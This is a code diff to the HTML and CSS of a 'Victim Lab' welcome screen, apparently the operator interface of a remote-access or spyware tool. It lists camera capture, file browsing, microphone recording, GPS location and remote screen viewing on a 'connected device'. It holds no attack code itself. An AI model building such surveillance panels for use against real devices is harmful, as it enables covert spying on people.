@@ -1,1 +1,87 @@
-<p style="vertical-align: middle; color:black;font-size:200%; text-align: center;margin:0;top:50%;left: 50%;transform: translate(-50%, -50%);;position: absolute">"Stay Educated"</p>
+<div class="welcome-container">
+    <div class="welcome-content">
+        <i class="shield alternate icon welcome-icon"></i>
+        <h2 class="welcome-title">Victim Lab</h2>
+        <p class="welcome-desc">Select a feature from the navigation bar above to interact with the connected device.</p>
+        
+        <div class="feature-hints">
+            <div class="hint-item">
+                <i class="camera icon"></i>
+                <span>Camera - Capture photos</span>
+            </div>
+            <div class="hint-item">
+                <i class="folder icon"></i>
+                <span>Files - Browse file system</span>
+            </div>
+            <div class="hint-item">
+                <i class="microphone icon"></i>
+                <span>Mic - Record audio</span>
+            </div>
+            <div class="hint-item">
+                <i class="map marker icon"></i>
+                <span>Location - GPS coordinates</span>
+            </div>
+            <div class="hint-item">
+                <i class="desktop icon"></i>
+                <span>Screen - Remote display</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    .welcome-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+        padding: 40px;
+    }
+    
+    .welcome-content {
+        text-align: center;
+        max-width: 400px;
+    }
+    
+    .welcome-icon {
+        font-size: 48px;
+        color: var(--text-muted);
+        margin-bottom: 16px;
+    }
+    
+    .welcome-title {
+        margin: 0 0 8px;
+        font-size: 24px;
+        font-weight: 600;
+        color: var(--text-primary);
+    }
+    
+    .welcome-desc {
+        margin: 0 0 24px;
+        font-size: 13px;
+        color: var(--text-secondary);
+    }
+    
+    .feature-hints {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 8px;
+    }
+    
+    .hint-item {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        padding: 6px 12px;
+        background: var(--bg-primary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        font-size: 11px;
+        color: var(--text-secondary);
+    }
+    
+    .hint-item i {
+        color: var(--accent-primary);
+    }
+</style>
